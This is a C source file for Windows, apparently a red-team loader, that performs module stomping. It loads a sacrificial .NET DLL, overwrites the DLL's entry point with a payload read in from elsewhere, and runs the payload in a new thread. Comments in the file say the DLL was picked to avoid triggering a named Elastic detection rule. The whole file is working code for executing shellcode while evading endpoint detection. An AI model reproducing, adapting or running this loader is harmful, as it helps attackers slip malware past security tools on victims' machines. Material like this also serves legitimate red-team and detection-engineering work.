#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include "../common.h"

// Default sacrificial DLL - use non-System32 DLL to avoid Elastic detection
// System32 DLLs like combase.dll trigger image_hollow_from_unusual_stack rule
#ifndef STOMP_DLL_PATH
#define STOMP_DLL_PATH L"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\mscordacwks.dll"
#endif

int main(int argc, char* argv[]) {
    BYTE* payload = NULL;
    DWORD payloadSize = 0;
    if (!LoadPayload(&payload, &payloadSize)) return 1;

    PrintStep(2, "Loading sacrificial DLL");
    HMODULE hModule = LoadLibraryW(STOMP_DLL_PATH);
    if (!hModule) {
        PrintError("LoadLibrary failed");
        // Fallback to another DLL
        hModule = LoadLibraryW(L"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\clr.dll");
        if (!hModule) { PrintError("Fallback LoadLibrary also failed"); free(payload); return 1; }
        printf("[+] Loaded fallback DLL\n");
    }
    wprintf(L"[+] %s loaded at: 0x%p\n", STOMP_DLL_PATH, hModule);

    PrintStep(3, "Verifying injection");
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + dosHeader->e_lfanew);
    PIMAGE_SECTION_HEADER sectionHeader = IMAGE_FIRST_SECTION(ntHeaders);

    LPVOID textAddr = NULL;
    DWORD textSize = 0;

    printf("[+] Number of sections: %d\n", ntHeaders->FileHeader.NumberOfSections);
    printf("[DEBUG] NT Headers at: 0x%p\n", ntHeaders);
    printf("[DEBUG] Section headers at: 0x%p\n", sectionHeader);
    printf("[DEBUG] OptionalHeader size: %u\n", ntHeaders->FileHeader.SizeOfOptionalHeader);

    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        if (strcmp((char*)sectionHeader[i].Name, ".text") == 0) {
            textAddr = (LPVOID)((BYTE*)hModule + sectionHeader[i].VirtualAddress);
            textSize = sectionHeader[i].Misc.VirtualSize;
            printf("[DEBUG] Section %d: '.text' (Raw: 0x%lx)\n", i, sectionHeader[i].SizeOfRawData);
            break;
        }
    }

    if (!textAddr) { PrintError("Could not find .text section"); free(payload); return 1; }
    printf("[+] Found .text section at: 0x%p, size: %lu\n", textAddr, textSize);

    DWORD entryPointRVA = ntHeaders->OptionalHeader.AddressOfEntryPoint;
    LPVOID entryPoint = (LPVOID)((BYTE*)hModule + entryPointRVA);
    printf("[+] Entry Point address: 0x%p\n", entryPoint);

    DWORD availableMemory = textSize;
    printf("[+] Available memory (from EP): %lu bytes\n", availableMemory);
    printf("[+] Payload size: %lu bytes\n", payloadSize);

    if (payloadSize > textSize) {
        printf("[-] Payload (%lu) exceeds .text section (%lu)\n", payloadSize, textSize);
        free(payload);
        return 1;
    }
    PrintSuccess("Payload size verification passed");

    PrintStep(4, "Stomping module memory");
    printf("[*] Writing payload to address: 0x%p\n", entryPoint);
    printf("[+] Payload size: %lu bytes\n", payloadSize);
    printf("[+] Address range: 0x%p - 0x%p\n", entryPoint,
           (BYTE*)entryPoint + payloadSize);

    DWORD oldProtect;
    if (!VirtualProtect(entryPoint, payloadSize, PAGE_READWRITE, &oldProtect)) {
        PrintError("VirtualProtect (RW) failed");
        free(payload);
        return 1;
    }
    PrintSuccess("Memory protection changed to RW");

    memcpy(entryPoint, payload, payloadSize);
    PrintSuccess("Payload written to entry point");
    free(payload);

    DWORD tmpProtect;
    VirtualProtect(entryPoint, payloadSize, oldProtect, &tmpProtect);
    PrintSuccess("Memory protection restored to RX");
    PrintSuccess("Module stomping completed");

    PrintStep(5, "Executing payload via CreateThread");
    printf("[*] Creating thread...\n");
    printf("[+] Start Address: 0x%p (stomped DLL entry)\n", entryPoint);
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)entryPoint, NULL, 0, NULL);
    if (!hThread) { PrintError("CreateThread failed"); return 1; }

    DWORD tid = GetThreadId(hThread);
    printf("[+] Thread created (ID: %lu)\n", tid);
    PrintSuccess("Thread executing payload immediately");

    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);

    return 0;
}
